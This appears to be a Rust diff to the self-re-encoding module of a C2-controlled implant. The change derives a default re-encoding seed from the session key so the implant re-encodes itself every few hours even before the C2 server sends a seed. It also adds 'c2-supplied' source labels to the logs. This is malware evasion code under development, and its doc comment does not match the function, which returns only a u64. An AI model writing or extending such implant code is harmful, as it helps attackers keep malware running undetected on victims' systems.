@@ -29,7 +29,8 @@ use std::sync::atomic::{AtomicU64, Ordering};
 use std::time::{Duration, SystemTime};
 
 /// Seed for the next re-encoding pass.  Set by the C2 server via
-/// `Command::SetReencodeSeed`; defaults to a timestamp-derived value.
+/// `Command::SetReencodeSeed`; defaults to a hash of the session key so
+/// the feature is active from the first cycle even without C2 input.
 static CURRENT_SEED: AtomicU64 = AtomicU64::new(0);
 
 /// Interval between automatic re-encoding passes.  Updated from config.
@@ -38,10 +39,33 @@ static REENCODE_INTERVAL_SECS: AtomicU64 = AtomicU64::new(DEFAULT_REENCODE_INTER
 /// Default re-encoding interval: 4 hours.
 pub const DEFAULT_REENCODE_INTERVAL_SECS: u64 = 4 * 3600;
 
+/// Derive a non-zero default seed from the session key material.
+///
+/// Uses the first 8 bytes of the SHA-256 hash of the session key, ensuring
+/// the re-encode feature is active from the first cycle even before the
+/// C2 server sends `SetReencodeSeed`.
+///
+/// Returns the derived seed and a static string indicating the source
+/// ("auto-derived" for this path vs "c2-supplied" for `set_seed`).
+pub fn derive_default_seed(session_key: &[u8; 32]) -> u64 {
+    use sha2::Digest;
+    let hash = Sha256::digest(session_key);
+    let seed = u64::from_le_bytes(hash[..8].try_into().expect("slice is 8 bytes"));
+    // Ensure non-zero
+    let seed = if seed == 0 { 1u64 } else { seed };
+    log::info!(
+        "self_reencode: auto-derived default seed 0x{seed:016x} from session key"
+    );
+    seed
+}
+
 /// Set the seed that will be used for the next re-encoding pass.
+///
+/// Logs the seed source as "c2-supplied" so operators can distinguish
+/// between a C2-sent seed and the auto-derived default.
 pub fn set_seed(seed: u64) {
     CURRENT_SEED.store(seed, Ordering::SeqCst);
-    log::info!("self_reencode: seed updated to 0x{seed:016x}");
+    log::info!("self_reencode: seed updated to 0x{seed:016x} (source: c2-supplied)");
 }
 
 /// Get the current seed.
